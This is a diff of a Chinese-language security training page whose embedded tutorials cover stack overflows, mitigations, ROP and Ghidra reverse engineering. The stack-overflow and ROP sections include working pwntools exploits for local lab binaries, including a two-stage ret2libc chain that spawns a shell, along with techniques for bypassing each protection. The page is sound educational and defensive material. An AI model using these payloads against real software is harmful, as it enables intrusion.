@@ -4656,70 +4656,70 @@ try (PreparedStatement ps = conn.prepareStatement(sql)) {
 
 
 <script type="text/markdown" id="md-bin-stack-overflow">
-栈溢出不是「写多了几个字节」，而是**写入越过了缓冲区边界，覆盖了控制流数据**。要理解它，先得看懂栈帧。
+栈溢出不是「多写了几个字节」这么简单，它说的是**写超了缓冲区，把控制流数据给盖住了**。想明白它，先得看懂栈帧。
 
-## 一、x86-64 的函数调用约定
+## 一、x86-64 怎么传参
 
-调用 `func(a, b)` 时：
+调用 `func(a, b)` 的时候：
 
 ```
-参数：rdi=a, rsi=b, rdx, rcx, r8, r9（前六个用寄存器，其余压栈）
+参数：rdi=a, rsi=b, rdx, rcx, r8, r9（前六个走寄存器，剩下压栈）
 返回：rax
 调用者保存：rax rcx rdx rsi rdi r8-r11
 被调用者保存：rbx rbp r12-r15
 ```
 
-进入函数后的标准序言（prologue）：
+函数一进来，先来一手标准的开场（prologue）：
 
 ```asm
-push rbp          ; 保存调用者的栈基址
-mov  rbp, rsp     ; 建立当前帧
-sub  rsp, 0x40    ; 为局部变量分配 0x40 字节
+push rbp          ; 先把调用者的栈基址存起来
+mov  rbp, rsp     ; 立起当前这层的帧
+sub  rsp, 0x40    ; 给局部变量腾 0x40 字节
 ```
 
-于是栈上的布局（高地址在下）：
+于是栈上就长这样（高地址在上）：
 
 ```
 +------------------+ 高地址
 | 调用者的栈帧        |
 +------------------+
-| 返回地址 (8 字节)   |  ← rbp+8，函数返回时 rip 从这里取
+| 返回地址 (8 字节)   |  ← rbp+8，函数 ret 时从这儿取
 +------------------+
 | 保存的 rbp (8 字节) |  ← rbp
 +------------------+
 | 局部变量 / 缓冲区   |  ← rbp-0x40
-+------------------+ 低地址  ← rsp
++------------------+ 低地址 ← rsp
 ```
 
-**关键点**：缓冲区在低地址，返回地址在它上方。往缓冲区里写超出长度的数据，超过的部分会依次覆盖「保存的 rbp」和「返回地址」。
+重点就一句：**缓冲区在低地址，返回地址在它上面**。你往里灌超长的数据，多出来的部分会一路往上，先盖掉保存的 rbp，再盖掉返回地址。
 
-## 二、为什么 gets / strcpy 危险
+## 二、gets 为什么危险
 
 ```c
 void vulnerable(void) {
     char buf[32];
-    gets(buf);          /* 不限长度，一直读到换行 */
+    gets(buf);          /* 不限长度，读到换行才停 */
 }
 ```
 
-`gets` 不知道 `buf` 有多长。输入 40 个字符：前 32 个填满缓冲区，接着 8 个覆盖保存的 rbp，再 8 个覆盖返回地址。
+`gets` 根本不知道 `buf` 有多大。你输 40 个字符：前 32 个填满缓冲区，接着 8 个盖掉 rbp，再 8 个正好盖上返回地址。
 
-函数 `ret` 时，CPU 从栈上弹出返回地址装载到 `rip`——**控制流就被劫持了**。
+函数 `ret` 的时候，CPU 从栈上弹这个地址装进 `rip`——**控制流就被你接管了**。
 
-## 三、算偏移：三个方法
+## 三、偏移怎么算：三个办法
 
-1. **数汇编**：看 `sub rsp, 0x??` 与缓冲区相对 rbp 的位置
-2. **看反汇编**：`objdump -d -M intel ./vuln | less`，找 `lea rax, [rbp-0x30]` 这类指令
-3. **cyclic 模式**（pwntools）：发一段有规律的字符，崩溃时看 `rip` 的值能算出精确偏移
+1. **数汇编**：看 `sub rsp, 0x??`，再看缓冲区相对 rbp 在哪
+2. **看反汇编**：`objdump -d -M intel ./vuln`，找 `lea rax, [rbp-0x30]` 这种
+3. **cyclic（pwntools）**：发一串有规律的字符，崩了看 `rip` 的值，反推偏移
 
 ```python
 from pwn import *
 payload = cyclic(200)
-# 崩溃后看核心转储里 rip 的值，例如 0x6161616c
-print(cyclic_find(0x6161616c))   # 得到偏移
+# 崩了以后看 core dump 里 rip 是多少，比如 0x6161616c
+print(cyclic_find(0x6161616c))   # 这就是偏移
 ```
 
-## 四、最小复现（仅本地靶场）
+## 四、最小复现（只在你自己的靶场里跑）
 
 ```c
 // gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln
@@ -4732,54 +4732,54 @@ void vuln(void) {
 int main(void) { vuln(); return 0; }
 ```
 
-关闭保护是为了**先理解原理**。真实环境里 Canary、NX、PIE 会逐个拦住你——这正是后面两篇要讲的。
+先关保护，是为了**先把原理搞懂**。真实环境里 Canary、NX、PIE 会一个个拦你——那正是后面两篇要讲的。
 
 ```python
 from pwn import *
 elf = ELF('./vuln')
 p = process('./vuln')
-p.sendline(b'A' * 72 + p64(elf.symbols['win']))   # 64 缓冲 + 8 保存rbp
+p.sendline(b'A' * 72 + p64(elf.symbols['win']))   # 64 缓冲 + 8 保存 rbp
 p.interactive()
 ```
 
-## 五、栈溢出的现代变体
+## 五、现在的变体
 
 | 类型 | 特点 |
 | --- | --- |
-| 返回地址覆盖 | 最经典，需绕过 Canary/NX/PIE |
-| 栈上 shellcode | 需要可执行栈（`-z execstack`），现代系统基本没有 |
+| 覆盖返回地址 | 最经典，得绕 Canary / NX / PIE |
+| 栈上 shellcode | 要可执行栈（`-z execstack`），现代系统基本没有 |
 | ret2libc | 跳到 libc 里的 `system("/bin/sh")` |
-| ret2csu / ROP | 拼 gadget 绕过 NX（见下一篇） |
-| 格式化字符串 | 任意地址读写，常与栈溢出配合 |
+| ret2csu / ROP | 拼 gadget 绕过 NX（下一篇讲） |
+| 格式化字符串 | 任意地址读写，常跟栈溢出让配合 |
 
-## 六、防御侧怎么写
+## 六、防守侧怎么写
 
-1. **永不使用** `gets` / `strcpy` / `sprintf` / `strcat`
-2. 用 `fgets(buf, sizeof buf, stdin)` / `snprintf` / `strncpy` 并保证结尾 `\0`
+1. **永别用** `gets` / `strcpy` / `sprintf` / `strcat`
+2. 改用 `fgets(buf, sizeof buf, stdin)` / `snprintf` / `strncpy`，记得补 `\0`
 3. 编译加 `-fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie`
-4. 关键服务开启 `RELRO` 与 `ASLR`
-5. 用静态分析（`clang --analyze`、`cppcheck`）扫出危险调用
+4. 关键服务开 RELRO 和 ASLR
+5. 静态分析（`clang --analyze`、`cppcheck`）扫危险调用
 
-## 七、练习
+## 七、动手练
 
-1. 在本地编译上面那个 `vuln.c`，用 `cyclic` 算出精确偏移
-2. 打开 `-fstack-protector` 重新编译，观察崩溃信息变成 `*** stack smashing detected ***`
-3. 用 `gdb` 在 `ret` 前下断点，观察 `rsp` 指向的值如何变成你的 payload
+1. 本地编译上面那个 `vuln.c`，用 `cyclic` 把偏移算准
+2. 加上 `-fstack-protector` 重编，看崩溃信息变成 `*** stack smashing detected ***`
+3. 用 `gdb` 在 `ret` 前打断点，盯着 `rsp` 指向的值怎么变成你的 payload
 
 ## 一句话总结
 
-栈溢出 = **数据越界 + 控制流数据在数据上方**。看懂栈帧布局，才知道为什么偏移是「缓冲大小 + 8」，也才知道每一层保护在拦什么。
+栈溢出的公式就一条：**数据越界 + 控制流数据正好在数据上方**。看懂栈帧，你才知道偏移为啥是「缓冲大小 + 8」，也才知道每层保护在拦什么。
 </script>
 
 
 <script type="text/markdown" id="md-bin-protections">
-保护机制的目标不是「不可能被利用」，而是**让利用从「写几行 payload」变成「需要多个前置条件」**。
+保护机制追求的不是「绝对打不了」，而是**让利用从「写几行 payload」变成「得先解决一堆前置条件」**。
 
 ## 一、先学会看：checksec
 
 ```bash
 checksec --file=./vuln
-# 或 pwntools 里：pwn checksec ./vuln
+# pwntools 里也行：pwn checksec ./vuln
 ```
 
 ```
@@ -4790,33 +4790,33 @@ NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
 
-这四行决定了你的攻击路线。
+这四行基本就决定了你的攻击路线。
 
-## 二、NX（No-eXecute）：栈不可执行
+## 二、NX：栈不给执行
 
-**原理**：页表里给栈/堆标记「不可执行」，跳过去就触发段错误。
+**原理**：页表里把栈和堆标成「不可执行」，你跳过去就是段错误。
 
-**拦住了**：`ret2shellcode`（把 shellcode 放栈上再跳过去）。
+**拦住了什么**：`ret2shellcode`（把 shellcode 放栈上再跳过去）。
 
-**绕过思路**：
-- **ret2libc**：跳到已有代码（libc 的 `system`）
-- **ROP**：拼已有指令片段（下一篇）
-- **mprotect**：调用 `mprotect` 把某段内存改成可执行
+**怎么绕**：
+- **ret2libc**：跳到现成的 libc `system`
+- **ROP**：拼现成指令片段（下一篇细讲）
+- **mprotect**：调系统调用把某段内存改成可执行
 
-**防御价值**：极高。它逼攻击者从「写代码」变成「复用代码」。
+**它的价值极高**：逼着攻击者从「写新代码」变成「复用已有代码」。
 
-## 三、ASLR / PIE：地址随机化
+## 三、ASLR / PIE：地址随机了
 
-**ASLR**（系统级）：每次进程启动，栈、堆、libc 的基址随机。
-**PIE**（编译级）：可执行文件本身也随机加载。
+**ASLR**（系统级）：每次启动，栈、堆、libc 的基址都随机。
+**PIE**（编译级）：连可执行文件本身也随机加载。
 
-**拦住了**：硬编码地址的 payload。
+**拦住了什么**：硬编码地址的 payload。
 
-**绕过思路**：
-1. **信息泄露**：先读出一个地址（格式化字符串、越界读），算出基址
-2. **部分覆盖**：只改地址低 2 字节（页内偏移随机性小）
-3. **爆破**：32 位系统熵低时可行（约 1/4096）
-4. **不随机的东西**：`vsyscall`、某些未开 PIE 的模块
+**怎么绕**：
+1. **泄露**：先读出一个地址（格式化字符串、越界读），算出基址
+2. **部分覆盖**：只改低 2 字节（页内偏移随机性小）
+3. **爆破**：32 位系统熵低，可行（大概 1/4096）
+4. **找不随机的**：`vsyscall`、没开 PIE 的模块
 
 ```bash
 cat /proc/sys/kernel/randomize_va_space   # 2 = 完全开启
@@ -4824,48 +4824,48 @@ cat /proc/sys/kernel/randomize_va_space   # 2 = 完全开启
 
 ## 四、Canary：栈上的哨兵
 
-**原理**：函数返回前检查栈上一个随机值（末尾通常是 `\x00`）是否被改。
+**原理**：函数返回前，检查栈上那个随机值（末尾一般是 `\x00`）有没有被改。
 
 ```asm
-mov rax, fs:0x28      ; 取 canary
+mov rax, fs:0x28      ; 取出 canary
 mov [rbp-0x8], rax    ; 放到栈上
 ...
-cmp rax, [rbp-0x8]    ; 返回前比较
+cmp rax, [rbp-0x8]    ; 返回前对一下
 jne __stack_chk_fail
 ```
 
-**拦住了**：直接覆盖返回地址（会先踩坏 canary）。
+**拦住了什么**：直接盖返回地址（会先把 canary 踩坏）。
 
-**绕过思路**：
+**怎么绕**：
 1. **泄露 canary**：格式化字符串、越界读
-2. **不覆盖 canary**：只覆盖它上面的数据（如局部指针）
-3. **爆破**：fork 型服务 canary 不变，可逐字节猜（最多 7 字节）
+2. **绕过它**：只盖 canary 上面的数据（比如局部指针）
+3. **爆破**：fork 出来的服务 canary 不变，能逐字节猜（最多 7 字节）
 
-## 五、RELRO：保护 GOT 表
+## 五、RELRO：护住 GOT
 
-GOT 是「函数名 → 真实地址」的表。改写 GOT 就能劫持函数调用。
+GOT 是「函数名 → 真实地址」那张表，改了它就能劫持函数调用。
 
 | 级别 | 效果 |
 | --- | --- |
-| No RELRO | GOT 可写 |
-| Partial RELRO | `.got.plt` 仍可写（默认） |
-| Full RELRO | 启动时全部解析并只读，GOT 不可写 |
+| No RELRO | GOT 随便写 |
+| Partial RELRO | `.got.plt` 还能写（默认就这样） |
+| Full RELRO | 启动时全解析完，只读，写不了 |
 
-**Full RELRO 拦住了**：GOT 覆写类攻击。
+**Full RELRO 拦住了什么**：GOT 覆写那类攻击。
 
-## 六、组合起来的难度梯度
+## 六、组合起来的难度
 
-| 组合 | 典型利用 |
+| 组合 | 典型打法 |
 | --- | --- |
-| 无保护 | ret2shellcode |
-| NX | ret2libc / ROP |
+| 没保护 | ret2shellcode |
+| 只有 NX | ret2libc / ROP |
 | NX + Canary | 先泄露 canary，再 ROP |
-| NX + Canary + PIE + ASLR | 需要泄露地址 + canary + gadget，链变长 |
-| 以上 + Full RELRO | 只能打栈上 ROP 或 FSOP / 堆利用 |
+| NX + Canary + PIE + ASLR | 地址、canary、gadget 都得先搞到，链变长 |
+| 再加 Full RELRO | 只能打栈上 ROP 或堆 / FSOP |
 
-这就是为什么 CTF 的 Pwn 题按保护给难度。
+这也是为啥 CTF 的 Pwn 题都按保护给难度。
 
-## 七、防御侧怎么开
+## 七、防守侧怎么开
 
 ```bash
 # 编译期
@@ -4876,58 +4876,55 @@ gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 \
 echo 2 > /proc/sys/kernel/randomize_va_space
 ```
 
-再配合：
-- **CET / Shadow Stack**（硬件控制流保护）
-- **seccomp** 限制系统调用
-- **ASan** 在测试环境发现越界
+再叠上：**CET / 影子栈**（硬件控流）、**seccomp**（限制系统调用）、**ASan**（测试期抓越界）。
 
-## 八、练习
+## 八、动手练
 
-1. 用同一份 `vuln.c` 编译四份：全关、只开 NX、开 NX+Canary、全开，分别 `checksec` 并记录
-2. 对开 Canary 的版本，用 gdb 观察 `__stack_chk_fail` 触发路径
-3. 找一道开了 Full RELRO 的靶场题，说明为什么 GOT 覆写走不通
+1. 同一份 `vuln.c` 编四版：全关、只开 NX、NX+Canary、全开，逐个 `checksec` 记下来
+2. 对开 Canary 那版，用 gdb 看 `__stack_chk_fail` 是怎么被触发的
+3. 找一道 Full RELRO 的题，说清为啥 GOT 覆写走不通
 
 ## 一句话总结
 
-每个保护机制都在**增加一个必须解决的前置条件**。Pwn 的功力，就体现在「能不能把这些条件逐个拆掉」。
+每个保护机制都在**多加一个必须解决的前置条件**。Pwn 的功力，就体现在「能不能把这些条件一个个拆掉」。
 </script>
 
 
 <script type="text/markdown" id="md-bin-rop">
-ROP（Return-Oriented Programming）的核心思想一句话：**既然不能执行我写的代码，那就用你已有的代码片段拼出我要的逻辑**。
+NX 不让栈执行，ROP 的回答很干脆：**不写新代码，全用你现成的**。
 
-## 一、gadget 是什么
+## 一、gadget 是个啥
 
-一段以 `ret` 结尾的短指令序列，位于程序或 libc 里：
+一小段以 `ret` 结尾的指令，藏在程序或 libc 里：
 
 ```asm
-pop rdi ; ret          ; 把栈顶弹到 rdi，然后返回
+pop rdi ; ret          ; 把栈顶弹进 rdi，然后返回
 pop rsi ; pop r15 ; ret
 mov [rdi], rsi ; ret
 syscall ; ret
 ```
 
-`ret` 的语义是「从栈顶取地址并跳过去」。把一串 gadget 地址连续摆在栈上，`ret` 就会一个个串起来执行——这就是 **ROP 链**。
+`ret` 的意思是「从栈顶取个地址跳过去」。你把一串 gadget 地址挨个摆在栈上，`ret` 就会一个接一个串下去——这就是 **ROP 链**。
 
-## 二、为什么必须靠 gadget
+## 二、为什么非靠 gadget 不可
 
-x86-64 下调用 `system("/bin/sh")` 需要：
+x86-64 下想调 `system("/bin/sh")`，需要：
 
 ```
 rdi = 指向 "/bin/sh" 的地址
 rip = system 的地址
 ```
 
-但我们**没法直接赋值寄存器**（栈不可执行）。所以需要 `pop rdi ; ret` 这样的片段：它从栈上取一个值放进 `rdi`，正好满足需要。
+但栈不能执行，你**没法直接给寄存器赋值**。所以才需要 `pop rdi ; ret` 这种片段：它从栈上取个值塞进 `rdi`，刚好是你要的。
 
-## 三、找 gadget
+## 三、gadget 怎么找
 
 ```bash
 ROPgadget --binary ./vuln | grep "pop rdi"
 ropper --file ./vuln --search "pop rdi"
 ```
 
-pwntools 里更省事：
+pwntools 更省事：
 
 ```python
 from pwn import *
@@ -4937,7 +4934,7 @@ rop.call('system', [next(elf.search(b'/bin/sh'))])
 print(rop.dump())
 ```
 
-## 四、构造一条最小链
+## 四、拼一条最小链
 
 ```python
 from pwn import *
@@ -4947,13 +4944,13 @@ libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 p = process('./vuln')
 
 POP_RDI = 0x4011f3                 # pop rdi ; ret（ROPgadget 找到的）
-RET     = 0x40101a                 # 单独一个 ret，用于栈对齐
+RET     = 0x40101a                 # 单独一个 ret，用来对齐栈
 
-payload  = b'A' * 72               # 覆盖到返回地址
-payload += p64(RET)                # 16 字节对齐（movaps 崩溃时加）
+payload  = b'A' * 72               # 盖到返回地址
+payload += p64(RET)                # 16 字节对齐（movaps 崩的时候加）
 payload += p64(POP_RDI) + p64(elf.got['puts'])
-payload += p64(elf.plt['puts'])    # 泄露 puts 的真实地址
-payload += p64(elf.symbols['main'])  # 泄露后回到 main，再来一轮
+payload += p64(elf.plt['puts'])    # 泄露 puts 真实地址
+payload += p64(elf.symbols['main'])  # 泄完回 main，再来一轮
 
 p.sendline(payload)
 leak = u64(p.recvline().strip().ljust(8, b'\x00'))
@@ -4961,7 +4958,7 @@ libc_base = leak - libc.symbols['puts']
 print(hex(libc_base))
 ```
 
-拿到 libc 基址后，第二轮直接：
+拿到 libc 基址，第二轮直接：
 
 ```python
 payload  = b'A' * 72
@@ -4970,11 +4967,11 @@ payload += p64(POP_RDI) + p64(libc_base + next(libc.search(b'/bin/sh')))
 payload += p64(libc_base + libc.symbols['system'])
 ```
 
-**两步走的原因**：ASLR 下 libc 基址未知，必须先泄露一次真实地址。
+**为啥要两步**：ASLR 下 libc 基址是未知的，得先泄露一次。
 
-## 五、ret2csu：没有 pop rdi 怎么办
+## 五、没有 pop rdi 怎么办：ret2csu
 
-有些程序里找不到 `pop rdi ; ret`。这时用 `__libc_csu_init` 里的两段代码：
+有些程序里真找不到 `pop rdi ; ret`。这时候用 `__libc_csu_init` 里的两段：
 
 ```asm
 ; gadget 1
@@ -4983,289 +4980,289 @@ mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call [r15 + rbx*8]
 pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 ```
 
-它们能一次设置三个参数，是「缺 gadget 时的通用备胎」。
+它能一口气设三个参数，是「缺 gadget 时的通用备胎」。
 
-## 六、ret2dlresolve 与 SROP（了解即可）
+## 六、另外几个名词（知道就行）
 
-| 技术 | 适用场景 |
+| 技术 | 什么时候用 |
 | --- | --- |
 | ret2csu | 缺 pop 系列 gadget |
-| ret2dlresolve | 程序没有 `system@plt`，需要动态解析符号 |
-| SROP | 能控制 `rax` 与触发信号，用 `sigreturn` 一次性设置所有寄存器 |
-| JOP/COP | 不以 ret 结尾的变体，绕过 CET 时会用 |
+| ret2dlresolve | 程序里没 `system@plt`，得动态解析符号 |
+| SROP | 能控 `rax` 又能触发信号，用 `sigreturn` 一次设全部寄存器 |
+| JOP / COP | 不以 ret 结尾的变体，绕 CET 时会用 |
 
-## 七、栈对齐：最常见的坑
+## 七、栈对齐：最容易翻车的坑
 
-调用 libc 函数时若 `rsp` 不是 16 字节对齐，`movaps` 会崩（`SIGSEGV` 在 `system+...`）。解法是在链里多插一个 `ret`：
+调 libc 函数时，如果 `rsp` 不是 16 字节对齐，`movaps` 就会崩（`SIGSEGV` 落在 `system+...`）。解法是在链里多插一个 `ret`：
 
 ```python
-payload += p64(RET)        # 只为了 +8 字节
+payload += p64(RET)        # 就为了 +8 字节
 ```
 
-这个坑几乎每个人都会踩一次。
+这坑几乎人人踩一次。
 
-## 八、防御侧怎么看
+## 八、防守侧怎么看
 
-1. **Full RELRO + CET** 会显著提高链构造难度
-2. **限制 gadget 数量**：编译选项、去除无用代码
-3. **seccomp**：即使拿到 shell，也只能做允许的系统调用
-4. **检测**：异常 `ret` 频率、栈上大量地址序列（可用 eBPF/IDS 观察）
+1. **Full RELRO + CET**：链会难拼很多
+2. **减少 gadget**：编译选项、去掉没用的代码
+3. **seccomp**：就算拿到 shell，也只能调允许的系统调用
+4. **检测**：异常 `ret` 频率、栈上一大串地址（eBPF / IDS 能看）
 
-## 九、练习
+## 九、动手练
 
-1. 用 `ROPgadget` 在一道开了 NX 的靶场题里找齐 `pop rdi / pop rsi / pop rdx`
-2. 手写一条 ret2libc 链，先只泄露地址，再第二轮拿 shell
-3. 故意不加对齐 `ret`，观察 `movaps` 崩溃，理解为什么要对齐
+1. 在一道开了 NX 的题里，用 `ROPgadget` 把 `pop rdi / pop rsi / pop rdx` 凑齐
+2. 手写一条 ret2libc：第一轮只泄露，第二轮拿 shell
+3. 故意不加对齐那个 `ret`，看 `movaps` 怎么崩，体会对齐的意义
 
 ## 一句话总结
 
-ROP 的本质是**把「函数调用」降级成「地址 + 寄存器填充」**。理解调用约定 + 会找 gadget，就能拼出任何单次调用；剩下的都是组合与泄露的艺术。
+ROP 的本质是**把「函数调用」降级成「地址 + 寄存器填充」**。懂调用约定、会找 gadget，单次调用你就能拼出任何东西；剩下的都是组合和泄露的手艺。
 </script>
 
 
 <script type="text/markdown" id="md-bin-ghidra">
-静态分析的价值：**在不运行样本的前提下，理解它的结构与意图**。Ghidra 免费、跨平台、反编译质量足够日常使用。
+静态分析图个啥？**不运行样本，也能搞清它什么结构、想干什么**。Ghidra 免费、跨平台，反编译质量日常够用。
 
-## 一、快速上手五步
+## 一、五步上手
 
 ```bash
-# 需要 JDK 21+
-ghidraRun          # 启动 GUI
+# 要 JDK 21+
+ghidraRun
 ```
 
-1. **New Project** → Non-Shared → 建工程
-2. **File → Import File** 导入样本（ELF / PE / 固件都行）
-3. 双击打开，Ghidra 自动做 **Auto Analysis**（识别函数、字符串、导出表）
-4. 看 **Symbol Tree**：Functions / Imports / Exports / Strings
-5. 从 `entry` 与 `main` 开始读
+1. **New Project** → Non-Shared，建个工程
+2. **File → Import File** 把样本拖进来（ELF、PE、固件都行）
+3. 双击打开，它自动跑 **Auto Analysis**（认函数、提字符串、读导出表）
+4. 看左边 **Symbol Tree**：Functions / Imports / Exports / Strings
+5. 从 `entry` 和 `main` 开始读
 
-命令行侧可用 `analyzeHeadless` 批量跑（后面给例子）。
+命令行也能批量跑，用 `analyzeHeadless`（后面给例子）。
 
-## 二、读懂入口链路
+## 二、入口那条链
 
 ```
-entry  →  __libc_start_main(main, ...)
+entry → __libc_start_main(main, ...)
 ```
 
-Ghidra 一般会自动识别 `main`。若没识别，从 `entry` 里找传给 `__libc_start_main` 的第一个参数，重命名成 main。
+Ghidra 一般能自动认出 `main`。没认出来就从 `entry` 里找传给 `__libc_start_main` 的第一个参数，改名成 main。
 
-**第一个阅读顺序建议**：
+**建议的阅读顺序**：
 
-1. `main` 里的分支（通常是命令行参数或菜单）
-2. 字符串引用（`Strings` 窗口 → 双击 → 看交叉引用）
-3. 导入函数（`Imports`：`recv`/`send` 说明有网络，`CreateFile` 说明有文件操作）
+1. 先看 `main` 里的分支（通常是命令行参数或菜单）
+2. 再翻 `Strings` 窗口，双击一个字符串，看它被谁引用
+3. 再看 `Imports`：有 `recv`/`send` 说明联网，有 `CreateFile` 说明碰文件
 
-## 三、四种高频操作
+## 三、四个高频操作
 
 **1. 交叉引用（XREF）**
 
-按 `Ctrl+Shift+F` 搜字符串，或双击字符串 → 看 `References to`。这是「从证据反推逻辑」最快的方法。
+`Ctrl+Shift+F` 搜字符串，或者直接双击字符串，看 `References to`。这是「从证据反推逻辑」最快的路子。
 
 **2. 还原结构体**
 
-反编译里出现 `*(int *)(param_1 + 0x10)` 时，右键 → `Auto Create Structure`，Ghidra 会推断字段布局。
+反编译里冒出 `*(int *)(param_1 + 0x10)`，右键 → `Auto Create Structure`，它会帮你猜字段布局。
 
-**3. 重命名**
+**3. 改名**
 
-`L` 重命名变量/函数。把 `FUN_00401a20` 改成 `check_license` 的那一刻，可读性会有质变。**边读边改名**是逆向的核心习惯。
+按 `L` 给变量/函数改名。把 `FUN_00401a20` 改成 `check_license` 那一瞬间，可读性会质变。**边读边改名，是逆向最核心的习惯**。
 
-**4. 修改函数签名**
+**4. 改函数签名**
 
-右键 → `Edit Function Signature`，指定参数类型（如 `char *`），反编译输出会立刻清晰。
+右键 → `Edit Function Signature`，把参数类型标成 `char *` 之类，反编译输出立马清楚。
 
-## 四、一个典型逆向片段
+## 四、一段典型代码
 
 ```c
 undefined8 check(char *input) {
   size_t len = strlen(input);
   if (len != 16) return 0;
   for (int i = 0; i < 16; i++) {
-    if ((input[i] ^ 0x2a) != expected[i]) return 0;   // 逐字节异或比较
+    if ((input[i] ^ 0x2a) != expected[i]) return 0;   // 逐字节异或对比
   }
   return 1;
 }
 ```
 
-看到这种结构，结论很直接：**密钥就是 `expected` 数组与 0x2a 异或**。静态分析的威力就在这里——不用运行就能写出解密脚本。
+看到这结构，结论很直接：**密钥就是 `expected` 和 0x2a 异或**。静态分析香就香在这——不用跑，直接写解密脚本。
 
-## 五、与其他工具配合
+## 五、和别的工具搭着用
 
-| 场景 | 工具 | 用途 |
+| 场景 | 工具 | 干啥 |
 | --- | --- | --- |
-| 快速看字符串 | `strings -a -n 6 bin` | 找 URL、路径、提示语 |
-| 看段与权限 | `readelf -S` / `objdump -h` | 判断是否有可执行段 |
-| 看反汇编 | `objdump -d -M intel` | 核对 Ghidra 的翻译 |
+| 快速捞字符串 | `strings -a -n 6 bin` | 找 URL、路径、提示语 |
+| 看段和权限 | `readelf -S` / `objdump -h` | 判断有没有可执行段 |
+| 看反汇编 | `objdump -d -M intel` | 核对 Ghidra 翻得对不对 |
 | 看依赖 | `ldd` / `readelf -d` | 判断用了哪些库 |
-| 动态跟进 | `gdb` + `pwndbg` | 验证静态推断 |
+| 动态跟一手 | `gdb` + `pwndbg` | 验证静态推断 |
 
-**静态 + 动态结合**：静态给出假设，动态验证假设。
+**静态给假设，动态验证假设**，这俩是一对。
 
-## 六、批量分析（脚本化）
+## 六、批量分析
 
 ```bash
 analyzeHeadless /tmp/proj myproj -import sample.bin \
   -postScript ExportFunctions.java -deleteProject
 ```
 
-可以写 Java/Python 脚本自动导出「函数列表 + 调用的 API + 字符串」，适合样本量大的场景。
+写个 Java/Python 脚本，把「函数列表 + 调的 API + 字符串」自动导出来，样本一多就靠它。
 
-## 七、常见障碍与对策
+## 七、卡住了怎么办
 
-| 现象 | 可能原因 | 对策 |
+| 现象 | 多半是 | 怎么办 |
 | --- | --- | --- |
-| 函数体是乱的 | 被壳/混淆 | 先脱壳（见下一篇） |
-| 找不到 main | stripped + 非标准启动 | 从 `__libc_start_main` 参数找 |
-| 全是 `FUN_xxx` | 无符号表 | 按调用关系与常数推断 |
-| 反编译报错 | 不支持的指令 / 花指令 | 用汇编视图，或先 patch 掉花指令 |
+| 函数体一团乱 | 加了壳 / 混淆 | 先脱壳（下一篇） |
+| 找不到 main | stripped + 非标准启动 | 从 `__libc_start_main` 的参数找 |
+| 全是 `FUN_xxx` | 没符号表 | 按调用关系和常数猜 |
+| 反编译报错 | 不支持的指令 / 花指令 | 切汇编视图，或先 patch 掉花指令 |
 
-## 八、纪律提醒
+## 八、一句纪律
 
-静态分析的对象常常是**恶意样本**。请在隔离环境（断网虚拟机）里操作，不要在生产机或宿主机直接打开样本；分析结论只用于防护与研判。
+静态分析的对象经常是**恶意样本**。在隔离环境（断网虚拟机）里弄，别在生产机或宿主机直接打开；结论只用于防护和研判。
 
-## 九、练习
+## 九、动手练
 
 1. 拿一道 CrackMe，用 Ghidra 找到校验函数，写出注册机
-2. 对一个 stripped 的 ELF，通过 `strings` 的交叉引用定位主要逻辑
-3. 用 `analyzeHeadless` 导出某二进制的全部导入函数与字符串
+2. 找个 stripped 的 ELF，靠 `strings` 的交叉引用摸到主要逻辑
+3. 用 `analyzeHeadless` 把某二进制的导入函数和字符串全导出来
 
 ## 一句话总结
 
-Ghidra 不是「自动告诉你答案」的工具，它是**让你读得更快的放大镜**。方法永远是：找证据（字符串/API/常数）→ 追引用 → 改名 → 还原结构 → 写结论。
+Ghidra 不是「自动告诉你答案」的黑盒，它是**让你读得更快的放大镜**。套路永远是：找证据（字符串 / API / 常数）→ 追引用 → 改名 → 还原结构 → 下结论。
 </script>
 
 
 <script type="text/markdown" id="md-rev-pe-elf">
-可执行文件不是「一堆机器码」，它是一份**带地图的装载说明书**。看懂地图，才知道程序从哪开始、依赖什么、代码在哪一段。
+可执行文件不是「一堆机器码」，它更像一份**带地图的装载说明书**。看懂地图，你才知道程序从哪开始、依赖什么、代码在哪一块。
 
-## 一、ELF（Linux）的结构
+## 一、ELF（Linux）长什么样
 
 ```
 ┌─────────────┐
-│ ELF Header  │ 魔数 ELF、架构、入口地址、段表偏移
+│ ELF Header  │ 魔数 \x7fELF、架构、入口地址、段表偏移
 ├─────────────┤
-│ Program Headers │ 给加载器看：哪些段要映射到内存、权限如何
+│ Program Headers │ 给加载器看：哪些段映射到内存、给什么权限
 ├─────────────┤
 │ .text       │ 代码
 │ .rodata     │ 只读数据（字符串常量）
-│ .data       │ 已初始化全局变量
-│ .bss        │ 未初始化全局变量（不占文件空间）
-│ .plt / .got │ 动态链接跳转与地址表
-│ .init/.fini │ 初始化/收尾代码
+│ .data       │ 有初值的全局变量
+│ .bss        │ 没初值的全局变量（不占文件空间）
+│ .plt / .got │ 动态链接的跳转和地址表
+│ .init/.fini │ 初始化 / 收尾代码
 ├─────────────┤
-│ Section Headers │ 给链接器/工具看：节名称与偏移
+│ Section Headers │ 给工具看：节名和偏移
 └─────────────┘
 ```
 
-两个关键区分：
+两个概念别混：
 
-- **段（Segment）** 给加载器用：决定内存权限（r-x / rw-）
-- **节（Section）** 给工具用：`.text` `.data` 只是段内的划分
+- **段（Segment）** 给加载器用，决定内存权限（r-x / rw-）
+- **节（Section）** 给工具用，`.text` `.data` 只是段内部再划的格子
 
 ```bash
-readelf -h ./a.out      # 头部：入口地址、架构
-readelf -l ./a.out      # 段：LOAD 段的权限
-readelf -S ./a.out      # 节：每节的大小与偏移
+readelf -h ./a.out      # 头：入口地址、架构
+readelf -l ./a.out      # 段：LOAD 段权限
+readelf -S ./a.out      # 节：每节大小和偏移
 readelf -d ./a.out      # 动态依赖
 ```
 
-## 二、PE（Windows）的结构
+## 二、PE（Windows）长什么样
 
 ```
-DOS Header (MZ) → DOS Stub → NT Headers (PE  )
+DOS Header (MZ) → DOS Stub → NT Headers (PE\0\0)
   ├ File Header（机器类型、节数量）
   └ Optional Header（入口 RVA、ImageBase、数据目录）
 Section Table → .text .rdata .data .rsrc .reloc
 ```
 
